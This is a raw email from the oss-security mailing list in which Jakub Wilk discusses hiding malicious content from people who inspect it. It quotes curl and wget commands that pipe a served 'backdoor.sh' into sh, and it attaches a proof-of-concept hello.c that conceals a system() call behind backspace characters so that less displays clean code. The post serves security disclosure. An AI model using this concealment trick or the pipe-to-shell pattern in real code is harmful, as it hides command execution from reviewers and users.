X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["2591" "Thursday" "21" "April" "2016" "21:45:59" "+0200" "Jakub Wilk" "jwilk@jwilk.net" "<20160421194559.GA3946@jwilk.net>" "94" "Re: [oss-security] s/party/hack like it's 1999" "^Date:" nil nil "4" "2016042119:45:59" "[oss-security] s/party/hack like it's 1999" (number mark "        jwilk@jwilk. Apr 21   94/2591  " thread-indent "\"Re: [oss-security] s/party/hack like it's 1999\"\n") "<20150917180319.1933609esmj3aaw4@webmail.alunos.dcc.fc.up.pt>" ("<20150917180319.1933609esmj3aaw4@webmail.alunos.dcc.fc.up.pt>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 15805 invoked by uid 550); 21 Apr 2016 19:46:18 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 15787 invoked from network); 21 Apr 2016 19:46:17 -0000
Message-ID: <20160421194559.GA3946@jwilk.net>
Mail-Followup-To: oss-security@lists.openwall.com
References: <20150917180319.1933609esmj3aaw4@webmail.alunos.dcc.fc.up.pt>
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="SLDf9lqlvOQaIe6s"
Content-Disposition: inline
In-Reply-To: <20150917180319.1933609esmj3aaw4@webmail.alunos.dcc.fc.up.pt>
User-Agent: Mutt/1.5.23.1 (2014-03-12)
X-Ovh-Tracer-Id: 3313523426359760807
X-Ovh-Remote: 5.172.247.249 (ip-5-172-247-249.free.aero2.net.pl)
X-Ovh-Local: 213.186.33.20 (ns0.ovh.net)
X-OVH-SPAMSTATE: OK
X-OVH-SPAMSCORE: 0
X-OVH-SPAMCAUSE: gggruggvucftvghtrhhoucdtuddrfeekkedrieekucetufdoteggodetrfdotffvucfrrhhofhhilhgvmecuqfggjfenuceurghilhhouhhtmecufedttdenuc
X-VR-SPAMSTATE: OK
X-VR-SPAMSCORE: 0
X-VR-SPAMCAUSE: gggruggvucftvghtrhhoucdtuddrfeekkedrieekgddufeelucetufdoteggodetrfdotffvucfrrhhofhhilhgvmecuqfggjfenuceurghilhhouhhtmecufedttdenuc
Date: Thu, 21 Apr 2016 21:45:59 +0200
From: Jakub Wilk <jwilk@jwilk.net>
Reply-To: oss-security@lists.openwall.com
Subject: Re: [oss-security] s/party/hack like it's 1999
To: oss-security@lists.openwall.com

--SLDf9lqlvOQaIe6s
Content-Type: text/plain; charset=us-ascii; format=flowed
Content-Disposition: inline

* up201407890@alunos.dcc.fc.up.pt, 2015-09-17, 18:03:
>$ curl 127.0.0.1/backdoor.sh
>#!/bin/bash
>echo doing something very nice!
>
>$ wget -qO - 127.0.0.1/backdoor.sh
>#!/bin/bash
>echo doing something very nice!
>
>
>But if we pipe it into a shell...
>
>
>$ curl -s 127.0.0.1/backdoor.sh|sh
>doing something evil!
>
>$ wget -qO - 127.0.0.1/backdoor.sh|sh
>doing something evil!
>
>
>You might be thinking "If I opened that in my browser, I would detect 
>it being malicious!"
>Well, think again...
>One can have all sorts of fun with user-agents, something that can 
>easily come to mind is verifying if the user-agent is from curl or 
>wget,

...or this:
https://www.idontplaydarts.com/2016/04/detecting-curl-pipe-bash-server-side/

>'less' doesn't interpret escape sequences unless the -r switch is used, 
>so stop aliasing it to 'less -r' just because there's no colored 
>output.

As somebody else noted, it should be s/doesn't interpret/neutralizes/ or 
something. But that doesn't mean you should feel safe if you don't use 
-r.

For example, when git automatically spawns a pager, it puts R in the 
LESS environment variable. (That would be fine if git escaped \033 
before passing them to the pager, but it doesn't. Oddly, it does seem to 
escape other control characters.) Now, -R is less convenient than -r for 
hiding malicious code, but you could still set foreground and background 
to black in hope that the victim's terminal background is also black.

But even without -r or -R, one can use backspace characters to hide evil 
payload:

| $ less -FX hello.c
| #include <stdio.h>
| #include <stdlib.h>
|
| int main(int argc, char **argv)
| {
|         /* Copyright 2015-2016 Jakub Wilk */
|         printf("Hello world!\n");
|         return 0;
| }
|
| $ gcc -Wall hello.c -o hello && ./hello
|  ________
| < ^H^H^H >
|  --------
|         \   ^__^
|          \  (oo)\_______
|             (__)\       )\/\
|                 ||----w |
|                 ||     ||

-- 
Jakub Wilk

--SLDf9lqlvOQaIe6s
Content-Type: text/x-csrc; charset=us-ascii
Content-Disposition: attachment; filename="hello.c"
Content-Transfer-Encoding: quoted-printable

#include <stdio.h>
#include <stdlib.h>

int main(int argc, char **argv)
{
	system("cowsay ^H^H^H");return 0; /* =08=08=08=08=08=08=08=08=08=08=08=08=
=08=08=08=08=08=08=08=08=08=08=08=08=08=08=08=08=08=08=08=08=08=08=08=08=08=
/ =08* Copyright 2015-2016 Jakub Wilk */
	printf("Hello world!\n");
	return 0;
}

--SLDf9lqlvOQaIe6s--
